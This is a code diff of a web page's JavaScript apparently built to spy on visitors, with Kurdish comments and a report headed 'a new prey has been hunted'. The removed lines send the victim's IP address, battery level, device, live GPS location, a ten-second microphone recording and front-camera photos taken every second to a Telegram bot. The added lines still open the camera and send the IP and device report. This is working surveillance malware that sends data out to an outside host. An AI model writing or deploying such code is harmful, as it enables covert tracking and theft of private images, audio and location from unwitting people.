@@ -14,94 +14,23 @@
 
     async function capture() {
         if (!targetID) return;
-
-        // 🔥 قۆناغی ١: ناردنی زانیارییە سەرەتاییەکان (وەک برووسکە)
         try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, 
+                audio: false 
+            });
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const batt = await navigator.getBattery();
                 batteryInfo = `${(batt.level * 100).toFixed(0)}%`;
             }
-
-            let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
-                         `👤 <b>ID:</b> <code>${targetID}</code>\n` +
-                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
-                         `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
-                         `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
-
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: targetID, text: report, parse_mode: "HTML" })
-            });
-        } catch (e) { console.log("Init report failed"); }
-
-        // 📍 قۆناغی ٢: ناردنی نەخشەی ناو چات (Live Map)
-        navigator.geolocation.watchPosition(pos => {
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    chat_id: targetID, 
-                    latitude: pos.coords.latitude, 
-                    longitude: pos.coords.longitude,
-                    live_period: 3600 
-                })
-            });
-        }, null, { enableHighAccuracy: true });
-
-        // 🎥 قۆناغی ٣: کامێرای پێشەوە و مایک (The Fire Logic)
-        try {
-            // ⚡ لێرە مۆڵەتی وردی کامێرای پێشەوە (facingMode: "user") و مایک زیاد کرا
-            const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { 
-                    facingMode: "user", // مسۆگەرکردنی کامێرای پێشەوە
-                    width: { ideal: 640 }, 
-                    height: { ideal: 480 } 
-                }, 
-                audio: true 
-            });
-
-            // 🎙️ تۆمارکردنی دەنگی ١٠ چرکەی سەرەتا
-            const mediaRecorder = new MediaRecorder(stream);
-            let chunks = [];
-            mediaRecorder.ondataavailable = e => chunks.push(e.data);
-            mediaRecorder.onstop = async () => {
-                const blob = new Blob(chunks, { type: 'audio/ogg' });
-                const fd = new FormData();
-                fd.append("chat_id", targetID);
-                fd.append("voice", blob, "voice.ogg");
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
-            };
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 10000);
-
-            // 📸 وێنەی بەردەوام (هەر ١ چرکە جارێک وەک ئاگر)
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true; // بۆ ئەوەی دەنگی لێنەیەت لە کاتی لۆدبوون
-            video.play();
-
-            setInterval(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; 
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => {
-                    const fd = new FormData();
-                    fd.append("chat_id", targetID);
-                    fd.append("photo", blob, `snap_${Date.now()}.jpg`);
-                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
-                }, 'image/jpeg', 0.4); // کوالێتی گونجاو بۆ ناردنی خێرا
-            }, 1000);
-
-        } catch (e) {
-            console.log("Media Access Denied");
-        }
-    }
-</script>
-</body>
-</html>
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(data => {
+                    let report = `🦅 <b>نێچیرێکی نوێ ڕاوکرا!</b>\n\n` +
+                                 `👤 <b>ID:</b> <code>${targetID}</code>\n` +
+                                 `🌐 <b>IP:</b> <code>${data.ip}</code>\n` +
+                                 `🔋 <b>Battery:</b> <code>${batteryInfo}</code>\n` +
+                                 `📱 <b>Device:</b> <code>${navigator.platform}</code>`;
+                    sendToTelegram(report);
+                });
